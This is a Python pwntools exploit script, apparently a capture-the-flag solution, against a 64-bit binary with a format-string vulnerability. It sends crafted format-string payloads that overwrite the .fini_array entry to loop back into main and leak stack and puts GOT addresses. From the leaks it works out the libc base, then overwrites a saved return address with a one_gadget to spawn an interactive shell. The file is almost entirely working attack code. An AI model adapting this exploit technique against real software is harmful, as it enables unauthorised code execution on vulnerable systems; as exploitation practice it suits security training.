#!/usr/bin/env python
# coding=utf-8
from pwn import *
import duchao_pwn_script
arch = 'amd64'
duchao_pwn_script.init_pwn_linux(arch)
pwnfile= './fmt_str_once_no_sys_x64_nopie'
io = process(pwnfile)
#io = remote('', )
elf = ELF(pwnfile)
rop = ROP(pwnfile)
libc =elf.libc


dem = 'input:\n'
io.recvuntil(dem)
payload = b"%40$p%16$s"
len1 = 16 -len(payload)
payload = payload.ljust(16 , b"a")
fini_array = 0x4031A8
main_adrr = elf.symbols["main"]
printf_got = elf.got["printf"]
puts_got = elf.got["puts"]
pop_rdi_ret = 0x401323 
duchao_pwn_script.dbg(io)
numb_written = 14 + 6 + len1
payload += fmtstr_payload(8, {fini_array :main_adrr}, numbwritten = numb_written )
payload += p64(puts_got)
io.send(payload)
# 6+align
io.recvuntil("0x")
stack_1 = int(io.recv(12),16)
stack_rbp = stack_1 -0x10
print("rbp is :",hex(stack_rbp))
new_rbp = stack_rbp -0xe0
print("new_rbp is :",hex(new_rbp))
puts_addr = u64(io.recv(6).ljust(8,b"\x00")) 
sys_addr , bin_sh_addr = duchao_pwn_script.libcsearch_sys_sh("puts" , puts_addr ,path = libc.path)
print("sys_addr  is :",hex(sys_addr))
print("bin_sh_addr  is :",hex(bin_sh_addr))
libc_base_addr  =  sys_addr - libc.symbols["system"] 
onegadgat = libc_base_addr + 0xe6c7e
print("onegadgat_addr  is :",hex(onegadgat))
io.recvuntil(dem)
# payload = fmtstr_payload(6, {new_rbp+0x8 : pop_rdi_ret , new_rbp+0x10 :bin_sh_addr , new_rbp+0x18:sys_addr} )
payload = fmtstr_payload(6, {new_rbp+0x8 :onegadgat} )
io.send(payload)

io.interactive()
